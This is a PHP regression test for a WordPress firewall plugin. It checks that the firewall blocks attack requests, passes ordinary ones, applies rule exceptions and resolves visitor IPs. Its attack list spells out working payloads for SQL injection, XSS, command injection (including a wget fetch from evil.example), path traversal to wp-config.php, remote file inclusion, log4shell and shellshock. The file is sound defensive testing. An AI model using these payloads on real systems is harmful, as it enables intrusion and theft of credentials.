<?php
/**
 * WAF regression tests: real attacks must be blocked, everyday traffic must pass.
 * Runs without WordPress. In the dev container:
 *   docker compose -f dev/docker-compose.yml exec wordpress php /uaip-tests/waf-test.php
 *
 * @package UaipSecurityFirewall
 */

// phpcs:disable WordPress.WP.AlternativeFunctions, WordPress.Security.EscapeOutput

define( 'UAIP_SFW_WAF_PREPEND', true );

$uaip_sfw_root = is_dir( '/var/www/html/wp-content/plugins/uaip-security-firewall' )
	? '/var/www/html/wp-content/plugins/uaip-security-firewall'
	: dirname( __DIR__ ) . '/plugin';
require $uaip_sfw_root . '/includes/lib/class-uaip-sfw-ip.php';
require $uaip_sfw_root . '/includes/lib/class-uaip-sfw-waf-request.php';
require $uaip_sfw_root . '/includes/lib/class-uaip-sfw-waf-engine.php';

$engine = new Uaip_Sfw_WAF_Engine( 5 );
$engine->load_json( $uaip_sfw_root . '/assets/waf-rules/core-rules.json' );

$failures = 0;
$count    = 0;

/**
 * Evaluates a request built from $data.
 *
 * @param array $data       Request data (see Uaip_Sfw_WAF_Request::from_array).
 * @param array $exceptions Exceptions.
 * @return array Verdict.
 */
function verdict( array $data, array $exceptions = array() ) {
	global $engine;
	$data += array(
		'method' => 'GET',
		'uri'    => '/',
		'ua'     => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36',
	);
	return $engine->evaluate( Uaip_Sfw_WAF_Request::from_array( $data ), $exceptions );
}

/**
 * Asserts and prints.
 *
 * @param string $name     Name.
 * @param bool   $expected Expected block.
 * @param array  $data     Request.
 * @param array  $exceptions Exceptions.
 */
function expect_block( $name, $expected, array $data, array $exceptions = array() ) {
	global $failures, $count;
	++$count;
	$v   = verdict( $data, $exceptions );
	$ids = implode( ',', array_column( $v['matched'], 'id' ) );
	if ( $v['block'] === $expected ) {
		echo ( $expected ? 'ok   block ' : 'ok   pass  ' ) . $name . ( $ids ? " [$ids]" : '' ) . "\n";
		return;
	}
	++$failures;
	echo 'FAIL ' . ( $expected ? 'should block ' : 'should pass  ' ) . $name . " (score {$v['score']}: $ids)\n";
}

/**
 * Plain assertion.
 *
 * @param string $name     Name.
 * @param mixed  $expected Expected.
 * @param mixed  $actual   Actual.
 */
function check( $name, $expected, $actual ) {
	global $failures, $count;
	++$count;
	if ( $expected === $actual ) {
		echo "ok   $name\n";
		return;
	}
	++$failures;
	echo "FAIL $name\n  expected: " . json_encode( $expected ) . "\n  actual:   " . json_encode( $actual ) . "\n";
}

echo "--- attacks (must block)\n";
$attacks = array(
	'UNION SELECT in query'             => array( 'query' => array( 'id' => "1 UNION SELECT user_login,user_pass FROM wp_users" ) ),
	'UNION/**/SELECT (comment split)'   => array( 'query' => array( 'id' => '1 UNION/**/SELECT 1,2,3' ) ),
	'UNION DISTINCT SELECT'             => array( 'query' => array( 'id' => '-1 union distinct select 1,2' ) ),
	'tautology quote'                   => array( 'body' => array( 'user' => "admin' OR 1=1 -- " ) ),
	'tautology numeric id'              => array( 'query' => array( 'p' => '5 or 1=1' ) ),
	'time-based sleep'                  => array( 'query' => array( 'id' => "1 AND SLEEP(5)" ) ),
	'information_schema'                => array( 'query' => array( 'q' => "x' and (select 1 from information_schema.tables)" ) ),
	'extractvalue error-based'          => array( 'query' => array( 'id' => "1 and extractvalue(1,concat(0x7e,version()))" ) ),
	'stacked drop table'                => array( 'body' => array( 'x' => "1; DROP TABLE wp_users" ), 'query' => array( 'id' => "1'" ) ),
	'script tag in comment'             => array( 'method' => 'POST', 'uri' => '/wp-comments-post.php', 'body' => array( 'comment' => 'hi <script>alert(1)</script>' ) ),
	'encoded script in query'           => array( 'query' => array( 's' => '%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E' ) ),
	'javascript: URI value'             => array( 'query' => array( 'redirect' => 'javascript:alert(1)' ) ),
	'img onerror'                       => array( 'body' => array( 'name' => '<img src=x onerror=alert(1)>' ) ),
	'attribute breakout onmouseover'    => array( 'query' => array( 'q' => '" onmouseover="alert(1)' ) ),
	'svg onload'                        => array( 'query' => array( 'q' => '<svg/onload=alert(1)>' ) ),
	'system() call'                     => array( 'query' => array( 'cmd' => "system('id');" ) ),
	'eval base64'                       => array( 'body' => array( 'x' => 'eval(base64_decode("ZWNobyAxOw=="))' ) ),
	'assert request var'                => array( 'query' => array( 'f' => 'assert($_POST[1])' ) ),
	'command chaining ;cat /etc'        => array( 'query' => array( 'host' => '127.0.0.1; cat /etc/passwd' ) ),
	'command substitution'              => array( 'query' => array( 'ip' => '$(whoami)' ) ),
	'wget pipe'                         => array( 'body' => array( 'u' => 'x| wget http://evil.example/sh -O /tmp/x' ) ),
	'path traversal'                    => array( 'query' => array( 'file' => '../../../../etc/passwd' ) ),
	'encoded traversal'                 => array( 'uri' => '/wp-content/plugins/x/dl.php?f=%2e%2e%2f%2e%2e%2fwp-config.php', 'query' => array( 'f' => '../../wp-config.php' ) ),
	'wp-config backup probe'            => array( 'uri' => '/wp-config.php.bak' ),
	'wp-config~ probe'                  => array( 'uri' => '/wp-config.php~' ),
	'RFI with trailing ?'               => array( 'query' => array( 'page' => 'http://evil.example/shell.txt?' ) ),
	'php://filter'                      => array( 'query' => array( 'file' => 'php://filter/convert.base64-encode/resource=index.php' ) ),
	'serialized object injection'       => array( 'cookies' => array( 'data' => 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}' ), 'query' => array( 'x' => 'php://input' ) ),
	'php upload name'                   => array( 'method' => 'POST', 'files' => array( 'shell.php' ) ),
	'double extension upload'           => array( 'method' => 'POST', 'files' => array( 'avatar.php.jpg' ) ),
	'phtml upload'                      => array( 'method' => 'POST', 'files' => array( 'x.phtml' ) ),
	'.htaccess upload'                  => array( 'method' => 'POST', 'files' => array( '.htaccess' ) ),
	'log4shell in user agent header'    => array( 'headers' => array( 'user-agent' => '${jndi:ldap://evil.example/a}' ) ),
	'log4shell in query'                => array( 'query' => array( 'q' => '${jndi:rmi://x/y}' ) ),
	'shellshock header'                 => array( 'headers' => array( 'x-test' => '() { :; }; /bin/cat /etc/passwd' ) ),
	'sqlmap user agent'                 => array( 'ua' => 'sqlmap/1.7.2#stable (https://sqlmap.org)' ),
	'JSON REST body SQLi'               => array( 'method' => 'POST', 'uri' => '/wp-json/x/v1/search', 'body' => array( 'filter' => array( 'id' => "1' UNION SELECT user_pass FROM wp_users-- " ) ) ),
	'raw XML body with script'          => array( 'method' => 'POST', 'raw' => '<a><b><script>alert(1)</script></b></a>' ),
	'admin-ajax unauthenticated XSS'    => array( 'method' => 'POST', 'uri' => '/wp-admin/admin-ajax.php', 'body' => array( 'action' => 'x', 'v' => '<script src=//evil.example/x.js></script>' ) ),
);
foreach ( $attacks as $name => $data ) {
	expect_block( $name, true, $data );
}

echo "--- everyday traffic (must pass)\n";
$benign = array(
	'plain home page'                   => array(),
	'search for a phrase'               => array( 'query' => array( 's' => 'how to reset wordpress password' ) ),
	'comment: sleep (8 hours)'          => array( 'method' => 'POST', 'body' => array( 'comment' => 'I need more sleep (8 hours at least) before work.' ) ),
	'comment: the system (beta)'        => array( 'method' => 'POST', 'body' => array( 'comment' => 'The new booking system (beta) is down again.' ) ),
	'comment: cats; cat lovers'         => array( 'method' => 'POST', 'body' => array( 'comment' => 'I love cats; cat lovers unite! Also dogs | id badges.' ) ),
	'comment: learn javascript: basics' => array( 'method' => 'POST', 'body' => array( 'comment' => 'Learn javascript: the basics, then move on to React.' ) ),
	'comment: select an option'         => array( 'method' => 'POST', 'body' => array( 'comment' => 'Open the menu; select an option from the list and update the page.' ) ),
	'comment: union members select'     => array( 'method' => 'POST', 'body' => array( 'comment' => 'The union will select a new leader next week.' ) ),
	'comment: or 1 = 1 in prose'        => array( 'method' => 'POST', 'body' => array( 'comment' => 'Pick tea or coffee, 1 = 1 cup each.' ) ),
	'comment mentions wp-config.php'    => array( 'method' => 'POST', 'body' => array( 'comment' => 'Edit wp-config.php and set WP_DEBUG to true.' ) ),
	'search for wp-config.php'          => array( 'query' => array( 's' => 'wp-config.php' ) ),
	'comment with one <img>'            => array( 'method' => 'POST', 'body' => array( 'comment' => 'Look at this <img src="https://example.com/cat.jpg">' ) ),
	'comment: eval (evaluation) report' => array( 'method' => 'POST', 'body' => array( 'comment' => 'Our eval (evaluation) report says the assert (claim) holds.' ) ),
	'redirect_to URL'                   => array( 'uri' => '/wp-login.php?redirect_to=https%3A%2F%2Fexample.com%2Fwp-admin%2F', 'query' => array( 'redirect_to' => 'https://example.com/wp-admin/' ) ),
	'password with quotes and SQL'      => array( 'method' => 'POST', 'uri' => '/wp-login.php', 'body' => array( 'log' => 'admin', 'pwd' => "x' OR 1=1 -- <script>" ) ),
	'nested password field'             => array( 'method' => 'POST', 'body' => array( 'account' => array( 'new_password' => "') union select 1--", 'email' => 'a@example.com' ) ) ),
	'WooCommerce checkout JSON'         => array( 'method' => 'POST', 'uri' => '/wp-json/wc/store/v1/checkout', 'body' => array( 'billing_address' => array( 'first_name' => "O'Brien", 'address_1' => '12 Union Street; Apt 3', 'email' => 'o.brien@example.com' ), 'customer_note' => 'Leave at door & ring bell' ) ),
	'contact form with apostrophes'     => array( 'method' => 'POST', 'body' => array( 'your-message' => "It's great - we'd like 2 = two quotes, please. Don't select the red one." ) ),
	'image upload'                      => array( 'method' => 'POST', 'files' => array( 'holiday-photo.jpg', 'report.pdf' ) ),
	'curl GET (not POST)'               => array( 'ua' => 'curl/8.4.0' ),
	'author archive by slug'            => array( 'uri' => '/author/jane/' ),
	'block editor JSON (tags as text)'  => array( 'method' => 'POST', 'uri' => '/wp-json/wp/v2/comments', 'body' => array( 'content' => 'Use the <details> element for FAQs.' ) ),
	'cookie with JSON value'            => array( 'cookies' => array( 'prefs' => '{"theme":"dark","lang":"en"}' ) ),
);
foreach ( $benign as $name => $data ) {
	expect_block( $name, false, $data );
}

echo "--- exceptions and methods\n";
$img2 = array( 'method' => 'POST', 'uri' => '/wp-json/contact/v1/send', 'body' => array( 'msg' => '<img src=x onerror=alert(1)>' ) );
expect_block( 'blocked without an exception', true, $img2 );
expect_block(
	'rule exceptions for the path let it through',
	false,
	$img2,
	array(
		array( 'rule' => 'sfw-xss-003', 'path' => '/wp-json/contact/' ),
		array( 'rule' => 'sfw-xss-004', 'path' => '/wp-json/contact/' ),
	)
);
expect_block( 'an exception for another path does not apply', true, $img2, array( array( 'rule' => '*', 'path' => '/other/' ) ) );
expect_block( '"*" exception switches every rule off for the path', false, $img2, array( array( 'rule' => '*', 'path' => '/wp-json/contact/' ) ) );
$parsed = Uaip_Sfw_WAF_Engine::parse_exceptions( "sfw-xss-003 /wp-json/contact/\n# comment\n* /legacy/\nbad rule with spaces\nsfw-x relative/path" );
check( 'parse_exceptions keeps valid lines', 2, count( $parsed['valid'] ) );
check( 'parse_exceptions reports invalid lines', array( 'bad rule with spaces', 'sfw-x relative/path' ), $parsed['invalid'] );
$v = verdict( array( 'method' => 'GET', 'ua' => 'python-requests/2.31' ) );
check( 'POST-only rule ignored on GET', 0, $v['score'] );
$v = verdict( array( 'method' => 'POST', 'ua' => 'python-requests/2.31' ) );
check( 'POST-only rule scores on POST', 3, $v['score'] );

echo "--- visitor IP\n";
$cf = array( 'REMOTE_ADDR' => '172.68.10.1', 'HTTP_CF_CONNECTING_IP' => '203.0.113.7' );
check( 'remote_addr ignores CDN header', '172.68.10.1', Uaip_Sfw_IP::client( $cf, 'remote_addr' ) );
check( 'cloudflare header trusted from a Cloudflare edge', '203.0.113.7', Uaip_Sfw_IP::client( $cf, 'cloudflare' ) );
check( 'cloudflare header ignored from a non-Cloudflare IP', '198.51.100.9', Uaip_Sfw_IP::client( array( 'REMOTE_ADDR' => '198.51.100.9', 'HTTP_CF_CONNECTING_IP' => '1.2.3.4' ), 'cloudflare' ) );
$xff = array( 'REMOTE_ADDR' => '10.0.0.2', 'HTTP_X_FORWARDED_FOR' => '6.6.6.6, 203.0.113.50, 10.0.0.1' );
check( 'XFF: right-most untrusted hop', '203.0.113.50', Uaip_Sfw_IP::client( $xff, 'x_forwarded_for', array( '10.0.0.0/8' ) ) );
check( 'XFF ignored when the peer is not a trusted proxy', '10.0.0.2', Uaip_Sfw_IP::client( $xff, 'x_forwarded_for', array( '192.168.0.0/16' ) ) );
check( 'X-Real-IP from a trusted proxy', '203.0.113.9', Uaip_Sfw_IP::client( array( 'REMOTE_ADDR' => '127.0.0.1', 'HTTP_X_REAL_IP' => '203.0.113.9' ), 'x_real_ip', array( '127.0.0.1' ) ) );
check( 'invalid header value falls back', '127.0.0.1', Uaip_Sfw_IP::client( array( 'REMOTE_ADDR' => '127.0.0.1', 'HTTP_X_REAL_IP' => 'evil' ), 'x_real_ip', array( '127.0.0.1' ) ) );
check( 'IPv4 CIDR match', true, Uaip_Sfw_IP::in_list( '192.168.5.20', array( '192.168.0.0/16' ) ) );
check( 'IPv4 CIDR miss', false, Uaip_Sfw_IP::in_list( '192.169.0.1', array( '192.168.0.0/16' ) ) );
check( 'IPv4 /30 boundary', array( true, false ), array( Uaip_Sfw_IP::in_list( '10.1.1.3', array( '10.1.1.0/30' ) ), Uaip_Sfw_IP::in_list( '10.1.1.4', array( '10.1.1.0/30' ) ) ) );
check( 'IPv6 CIDR match', true, Uaip_Sfw_IP::in_list( '2606:4700:10::6816:1', array( '2606:4700::/32' ) ) );
check( 'IPv4 never matches IPv6 range', false, Uaip_Sfw_IP::in_list( '1.2.3.4', array( '::/0' ) ) );
check( 'exact IP entry', true, Uaip_Sfw_IP::in_list( '203.0.113.5', array( '203.0.113.5' ) ) );
check( 'IP with port normalised', '203.0.113.5', Uaip_Sfw_IP::valid( '203.0.113.5:443' ) );
check( 'bracketed IPv6 normalised', '::1', Uaip_Sfw_IP::valid( '[::1]:8080' ) );
$list = Uaip_Sfw_IP::parse_list( "203.0.113.5\n10.0.0.0/8, 2001:db8::/32 # office\nnot-an-ip 10.0.0.0/33" );
check( 'parse_list valid entries', array( '203.0.113.5', '10.0.0.0/8', '2001:db8::/32' ), $list['valid'] );
check( 'parse_list invalid entries', array( 'not-an-ip', '10.0.0.0/33' ), $list['invalid'] );

echo "--- performance\n";
$start = microtime( true );
for ( $i = 0; $i < 200; $i++ ) {
	verdict( array( 'method' => 'POST', 'body' => array( 'comment' => str_repeat( 'The quick brown fox jumps over the lazy dog. ', 200 ) ) ) );
}
$ms = ( microtime( true ) - $start ) * 1000 / 200;
check( sprintf( 'a 9 KB comment is checked in under 5 ms (%.2f ms)', $ms ), true, $ms < 5 );
$huge  = verdict( array( 'method' => 'POST', 'body' => array( 'x' => str_repeat( 'a', 5 * 1024 * 1024 ) ) ) );
check( 'a 5 MB field is capped, not blocked', false, $huge['block'] );

echo "\n" . ( $count - $failures ) . "/$count passed\n";
exit( $failures ? 1 : 0 );
